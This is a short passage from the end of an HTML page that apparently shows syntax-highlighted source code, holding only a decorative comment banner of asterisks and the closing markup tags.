</span><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span></div></body>
</html>
